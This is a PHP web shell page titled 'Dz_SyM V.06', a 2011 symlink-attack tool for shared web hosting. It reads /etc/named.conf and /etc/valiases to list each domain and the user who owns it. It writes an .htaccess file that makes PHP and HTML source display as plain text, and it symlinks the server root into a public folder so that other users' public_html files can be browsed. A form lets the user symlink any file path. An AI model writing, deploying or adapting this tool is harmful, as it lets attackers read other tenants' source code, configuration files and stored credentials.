
      <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   
          "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

      <html xmlns="http://www.w3.org/1999/xhtml">
  
   
      <?
   
      /*------------------------------------------------------------------*\
   
      | ************        Symlink_Dz By AghiLaS            ***********|
   
      +-----------------------------------------------------------------|
  
      |                        C0d3d by : AghilaS                    |
  
      |                      Email : hacker-dz77@hotmail.fr                  |
  
      |                          Copyright ©2011 .                   |
  
      \*-----------------------------------------------------------*/
      ?>
 
      <head>
  
      <title>Dz_SyM V.06 By AghiLaS</title>
 
      <style type="text/css">
  
       
  
        html,body {
  
           margin: 0;
  
           padding: 0;
  
           outline: 0;
 
      }
  
 
      body {
  
          direction: ltr;
  
          background-color:#F4F4F4;
  
              color: rgb(153, 153, 154);
  
          text-align: center
  
      }
  
      input,textarea,select{
  
      font-weight: bold;
  
      color: lime;
  
      dashed white;
  
      border: 0.5px
  
      solid lime;
  
      background-color: black;
  
      }
 
      .hedr {
  
        font-family: Tahoma, Arial, sans-serif  ;
  
        font-size: 30px;
color:black ;
  text-shadow: 0px 4px 2px green;
      }
 
      .cont a{
  
       text-decoration: none;
  
       color:rgb(153, 153, 153);
  
       font-family: Tahoma, Arial, sans-serif  ;
  
       font-size: 16px;
  
       text-shadow: 0px 0px 2px ;
  
      }
  
      .cont a:hover{
 
        color:red ;
  
        text-shadow:2px 1px 4px red ;
  
      }
  
      .tmp tr td{
  
      border: solid 1px red;
  
      padding: 2px ;
  
        font-size: 13px;
 
      }
 
       
  
      .tmp tr td a {
  
        text-decoration: none;
  
      }
  
      .foter{
  
        font-size: 9pt;
  text-shadow:1px 1px 6px lime ;
        color: green ;
  
        text-align: center
  
      }
  
      .tmp tr td:hover{
  
      box-shadow: 1px 1px 4px black;
  
      }
  
      </style>
  
      </head>
  
      <body>
 
      <div class='all'>
 
      <?php
 
      $pg = basename(__FILE__);
 
      echo '<br /><div class="hedr">Dz_SyM V.06 By AghiLaS<br /><br /></div>' ;
 
      echo '<div class="cont">
 
      [ <a href="?sws=user">User and Domains </a>]
 
      [<a href="?sws=sym"> User and symlink </a>]

      [ <a href="?sws=file">Symlink file </a>]<br /><br /><br />

      </div>';
 
      if(isset($_REQUEST['sws']))
 
      {
 
      switch ($_REQUEST['sws'])
 
      {
 
      /// user and domine ///

      case 'user':

      $d00m = @file("/etc/named.conf");
 
      if(!$d00m)
 
      {
 
      die (" can't read /etc/named.conf");
 
      }
 
      else
  {

      echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td>";
 
      foreach($d00m as $dom){
  if(eregi("zone",$dom)){
 
      preg_match_all('#zone "(.*)"#', $dom, $domsws);
  flush();
  if(strlen(trim($domsws[1][0])) > 2){
 
      $user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));
 
      echo "

      <div class='tmp'>
 
      <tr>
  <td>

      <a target='_blank' href=http://www.".$domsws[1][0]."/>".$domsws[1][0]." </a>

      </td>

      <td>
 
      ".$user['name']."
 
      </td>
  </tr></div> ";
    }
   flush();
   }
    }
   }
 
       

      break;
 
      /// user + domine + symlink  ///
 
      case 'sym':
 
      @mkdir('sym',0777);
 
      $c  = "Options Indexes FollowSymLinks \n DirectoryIndex ssssss.htm \n AddType txt .php \n AddHandler txt .php \n  AddType txt .html \n AddHandler txt .html \n Options all \n Options \n Allow from all \n Require None \n Satisfy Any";
 
      $f =@fopen ('sym/.htaccess','w');
 
      fwrite($f , $c);
 
      $d00m = @file("/etc/named.conf");
 
      if(!$d00m)
 
      {

      die (" can't read /etc/named.conf");
 
      }
 
      else

      {
 
      echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td>";

      foreach($d00m as $dom){

      if(eregi("zone",$dom)){

      preg_match_all('#zone "(.*)"#', $dom, $domsws);

      flush();

      if(strlen(trim($domsws[1][0])) > 2){
 
      $user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));
 
       
 
      $site = $user['name'] ;
 
      @symlink("/","sym/sws.txt");

      echo "
 
      <tr>
 
      <td>
 
      <a target='_blank' href=http://www.".$domsws[1][0]."/>".$domsws[1][0]." </a>

      </td>
 
      <td>
 
      ".$user['name']."
 
      </td>
 
       
   

      <td>
 
      <a href='sym/sws.txt/home/".$user['name']."/public_html' target='_blank'>symlink </a>

      </td>
 
      </tr></div> ";

       
 
      flush();
 
      }

      }

      }

      }

 
      break;
  /// file  symlink ///
 
      case 'file':

      echo '

      The file path to symlink
 
      <br /><br />

      <form method="post">

      <input type="text" name="file" value="path file" /><br /><br />

      <input type="text" name="symfile" value="file sym" /> <br /><br />

      <input type="submit" value="symlink" name="symlink" /> <br /><br />
 
      </form>
 
      ';
 
      $pfile = $_POST['file'];
 
     $symfile = $_POST['symfile'];

      $symlink = $_POST['symlink'];
 
      if ($symlink)
 
      {
 
      @mkdir('sym',0777);

      $c  = "Options Indexes FollowSymLinks \n DirectoryIndex ssssss.htm \n AddType txt .php \n AddHandler txt .php \n  AddType txt .html \n AddHandler txt .html \n Options all \n Options \n Allow from all \n Require None \n Satisfy Any";

      $f =@fopen ('sym/.htaccess','w');

      @fwrite($f , $c);

      @symlink("$pfile","sym/$symfile");

      echo '<br /><br /><a target="_blank" href="sym/'.$symfile.'" >symfile file</a>';
 }

 break;
 
      default:

      header("Location: $pg");
 }

      /// home ///

      }else

      {

      echo '<div class="foter">CoDeD By AghiLaS <br /><br />

      MaDe In AlgeriA <br /><br />06-Dz Hackers ';

      }

      ?>
<!--

      /*------------------------------------------------------------------*\

      | ************        Symlink_Dz 06      By AghilaS       ***********|

      +-----------------------------------------------------------------|
      |
      |                        Author : AghiLaS                      |
      |
      |                      email : hacker-dz77@HoTmaiL.Fr          |
      |
      |                      from : 06 - algeria                     |
      |
      |                          Copyright ©2011 .                   |
      |
      \*-----------------------------------------------------------*/

      ->

      </div>

      </body>
 
      </html>
